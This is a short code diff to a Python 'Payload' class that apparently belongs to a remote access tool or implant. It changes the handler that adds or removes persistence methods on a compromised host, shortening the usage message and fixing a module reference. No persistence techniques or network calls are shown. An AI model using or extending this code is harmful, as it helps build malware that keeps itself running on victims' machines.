@@ -911,11 +911,11 @@ class Payload():
                 self.load('persistence')
             cmd, _, action = str(args).partition(' ')
             if cmd not in ('add','remove'):
-                return self.persistence.usage + str('\nmethods: %s' % ', '.join(methods))
+                return self.persistence.usage
             for method in globals()['persistence']._methods:
                 if action == 'all' or action == method:
                     getattr(globals()['persistence']._methods[method], cmd)()
-            return json.dumps(persistence.results())
+            return json.dumps(globals()['persistence'].results())
         except Exception as e:
             log("{} error: {}".format(self.persistence.func_name, str(e)))
 
